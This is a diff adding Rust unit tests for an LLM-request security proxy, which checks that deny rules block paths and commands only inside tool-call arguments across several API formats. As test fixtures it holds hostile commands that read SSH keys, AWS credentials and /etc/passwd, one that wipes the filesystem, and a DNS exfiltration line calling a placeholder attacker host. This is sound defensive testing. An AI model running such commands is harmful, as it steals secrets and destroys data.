@@ -474,3 +474,156 @@ fn whitespace_padding_does_not_evade_literal_deny() {
     let v = engine().scan(body).expect("violation");
     assert_eq!(v.kind, ViolationKind::Command);
 }
+
+// ── scan_request: command-shaped rules scoped to tool-call args ──────────────
+//
+// The proxy scans LLM request bodies with `scan_request`, which applies the
+// path / command / mount / destructive / exfil rules only inside tool-call
+// argument subtrees. Prose — system prompt, chat text, tool definitions, tool
+// results — can mention `~/.ssh` or `rm -rf` without being blocked (the
+// dogfooding failure: a project CLAUDE.md that *documents* a deny list made
+// every request from that repo 403).
+
+#[test]
+fn request_scan_ignores_denied_path_in_system_prompt() {
+    // The exact dogfooding shape: project instructions embedded in `system`
+    // describe the deny list itself.
+    let body = br#"{
+        "model": "claude-sonnet-4-6",
+        "system": "File paths matching deny list (e.g., ~/.ssh, ~/.aws, /etc/passwd)",
+        "messages": [{"role": "user", "content": "why was my request blocked?"}]
+    }"#;
+    assert!(engine().scan_request(body).is_none());
+    // Contrast: the full scan still flags it — MCP bodies keep strict semantics.
+    assert!(engine().scan(body).is_some());
+}
+
+#[test]
+fn request_scan_ignores_denied_path_and_command_in_chat_text() {
+    let body = br#"{
+        "messages": [
+            {"role": "user", "content": "how do I back up ~/.ssh safely?"},
+            {"role": "assistant", "content": [
+                {"type": "text", "text": "never run rm -rf / -- use rsync instead"}
+            ]}
+        ]
+    }"#;
+    assert!(engine().scan_request(body).is_none());
+}
+
+#[test]
+fn request_scan_ignores_denied_strings_in_tool_definitions_and_results() {
+    let body = br#"{
+        "tools": [{
+            "name": "bash",
+            "description": "Runs shell commands. Refuses rm -rf / and reads of ~/.ssh.",
+            "input_schema": {"type": "object"}
+        }],
+        "messages": [{"role": "user", "content": [
+            {"type": "tool_result", "tool_use_id": "t1",
+             "content": "guard.rs:12 blocks access to /etc/passwd and \\\\server\\share"}
+        ]}]
+    }"#;
+    assert!(engine().scan_request(body).is_none());
+}
+
+#[test]
+fn request_scan_blocks_denied_path_in_tool_use_input() {
+    let v = engine()
+        .scan_request(&fixture("request_with_blocked_path.json"))
+        .expect("violation");
+    assert_eq!(v.kind, ViolationKind::Path);
+    assert_eq!(v.matched, "~/.ssh");
+}
+
+#[test]
+fn request_scan_blocks_server_tool_use_input() {
+    let body = br#"{"messages":[{"role":"assistant","content":[
+        {"type":"server_tool_use","name":"bash","input":{"command":"cat ~/.aws/credentials"}}
+    ]}]}"#;
+    let v = engine().scan_request(body).expect("violation");
+    assert_eq!(v.kind, ViolationKind::Path);
+}
+
+#[test]
+fn request_scan_blocks_openai_tool_call_arguments() {
+    // `arguments` is a JSON-encoded string; substring matching still applies.
+    let body = br#"{"messages":[{"role":"assistant","tool_calls":[
+        {"id":"c1","type":"function","function":{
+            "name":"bash","arguments":"{\"command\":\"cat ~/.ssh/id_rsa\"}"}}
+    ]}]}"#;
+    let v = engine().scan_request(body).expect("violation");
+    assert_eq!(v.kind, ViolationKind::Path);
+}
+
+#[test]
+fn request_scan_blocks_legacy_function_call_arguments() {
+    let body = br#"{"messages":[{"role":"assistant","function_call":{
+        "name":"bash","arguments":"{\"command\":\"rm -rf / --no-preserve-root\"}"}}]}"#;
+    let v = engine().scan_request(body).expect("violation");
+    assert_eq!(v.kind, ViolationKind::Command);
+}
+
+#[test]
+fn request_scan_blocks_responses_api_function_call() {
+    let body = br#"{"input":[{"type":"function_call","name":"bash",
+        "arguments":"{\"command\":\"cat /etc/passwd\"}"}]}"#;
+    let v = engine().scan_request(body).expect("violation");
+    assert_eq!(v.kind, ViolationKind::Path);
+}
+
+#[test]
+fn request_scan_blocks_gemini_function_call_args() {
+    let body = br#"{"contents":[{"parts":[{"functionCall":{
+        "name":"bash","args":{"command":"mount smb://fileserver/share"}}}]}]}"#;
+    let v = engine().scan_request(body).expect("violation");
+    assert_eq!(v.kind, ViolationKind::Mount);
+}
+
+#[test]
+fn request_scan_still_detects_secrets_in_prose() {
+    // Data checks stay global: a credential in chat text is exfiltration-
+    // relevant no matter where it sits.
+    let body = br#"{"messages":[{"role":"user",
+        "content":"my key is AKIAIOSFODNN7EXAMPLE, is that safe to commit?"}]}"#;
+    let v = engine().scan_request(body).expect("violation");
+    assert_eq!(v.kind, ViolationKind::Secret);
+}
+
+#[test]
+fn request_scan_dlp_applies_to_prose_when_enabled() {
+    let rules = Ruleset {
+        detect_egress: true,
+        ..Ruleset::default()
+    };
+    let engine = SecurityEngine::new(rules);
+    let body = br#"{"system":"customer card on file: 4111 1111 1111 1111"}"#;
+    let v = engine.scan_request(body).expect("violation");
+    assert_eq!(v.kind, ViolationKind::Dlp);
+}
+
+#[test]
+fn request_scan_exfil_applies_only_to_tool_args() {
+    let rules = Ruleset {
+        detect_egress: true,
+        ..Ruleset::default()
+    };
+    let engine = SecurityEngine::new(rules);
+    // Same exfil-shaped string: prose passes, a tool invocation blocks.
+    let prose = br#"{"messages":[{"role":"user",
+        "content":"is dig $(whoami).attacker.example.com an exfil technique?"}]}"#;
+    assert!(engine.scan_request(prose).is_none());
+    let tool = br#"{"messages":[{"role":"assistant","content":[
+        {"type":"tool_use","name":"bash",
+         "input":{"command":"dig $(whoami).attacker.example.com"}}]}]}"#;
+    let v = engine.scan_request(tool).expect("violation");
+    assert_eq!(v.kind, ViolationKind::Exfil);
+}
+
+#[test]
+fn request_scan_bare_input_without_tool_use_type_is_prose() {
+    // An `input` key only counts as tool args when its block is typed
+    // `*tool_use` — a free-floating `input` field is prose.
+    let body = br#"{"input":{"command":"cat ~/.ssh/id_rsa"}}"#;
+    assert!(engine().scan_request(body).is_none());
+}
